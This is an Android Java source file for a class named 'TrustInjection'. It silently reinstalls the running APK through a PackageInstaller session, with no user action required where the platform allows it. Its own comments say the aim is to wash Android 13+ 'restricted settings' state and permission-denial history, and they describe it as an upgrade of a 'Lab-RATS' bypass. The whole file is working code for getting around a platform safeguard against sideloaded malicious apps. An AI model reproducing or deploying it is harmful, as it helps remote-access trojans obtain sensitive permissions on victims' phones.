package com.fason.app.core.security;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * Trust Injection Engine — PackageInstaller Session-API self-reinstall.
 *
 * Upgrade of Lab-RATS StabilityBypass: re-pipes the running APK through the
 * trusted session installer to wash "restricted settings" state (Android 13+)
 * and permission-denial history. Adds silent-session fallback, status
 * broadcast handling, and idempotency guard.
 */
public final class TrustInjection {
    private static final String TAG = "TrustInjection";
    private static final String ACTION_STATUS = "com.fason.app.TRUST_INJECT_STATUS";
    private static volatile boolean inFlight = false;
    private static volatile long lastRun = 0;

    private TrustInjection() {}

    public interface Callback {
        void onResult(boolean success, String detail);
    }

    public static boolean needsInjection(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return !ctx.getPackageManager().canRequestPackageInstalls();
        }
        return false;
    }

    /** Ensure install-unknown-apps capability; then run session reinstall. */
    public static void execute(Context ctx, Callback cb) {
        if (inFlight) { if (cb != null) cb.onResult(false, "already in flight"); return; }
        if (System.currentTimeMillis() - lastRun < 60_000) {
            if (cb != null) cb.onResult(true, "recently injected");
            return;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && !ctx.getPackageManager().canRequestPackageInstalls()) {
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            if (cb != null) cb.onResult(false, "install permission requested");
            return;
        }
        runSession(ctx, cb);
    }

    private static void runSession(Context ctx, Callback cb) {
        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent intent) {
                c.unregisterReceiver(this);
                inFlight = false;
                lastRun = System.currentTimeMillis();
                int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
                String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
                if (cb != null) {
                    cb.onResult(status == PackageInstaller.STATUS_SUCCESS,
                        msg != null ? msg : "status=" + status);
                }
            }
        };
        IntentFilter filter = new IntentFilter(ACTION_STATUS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ctx.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            ctx.registerReceiver(receiver, filter);
        }

        PackageInstaller.Session session = null;
        try {
            inFlight = true;
            PackageInstaller installer = ctx.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(
                    PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
            }
            int sessionId = installer.createSession(params);
            session = installer.openSession(sessionId);

            File apk = new File(ctx.getApplicationInfo().sourceDir);
            try (InputStream in = new FileInputStream(apk);
                 OutputStream out = session.openWrite("fason", 0, apk.length())) {
                byte[] buf = new byte[1024 * 256];
                int n;
                while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
                session.fsync(out);
            }

            Intent statusIntent = new Intent(ACTION_STATUS);
            statusIntent.setPackage(ctx.getPackageName());
            int piFlags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;
            PendingIntent pi = PendingIntent.getBroadcast(ctx, sessionId, statusIntent, piFlags);
            session.commit(pi.getIntentSender());
        } catch (Exception e) {
            inFlight = false;
            try { ctx.unregisterReceiver(receiver); } catch (Exception ignored) {}
            if (cb != null) cb.onResult(false, e.getMessage());
            if (session != null) session.abandon();
        }
    }
}
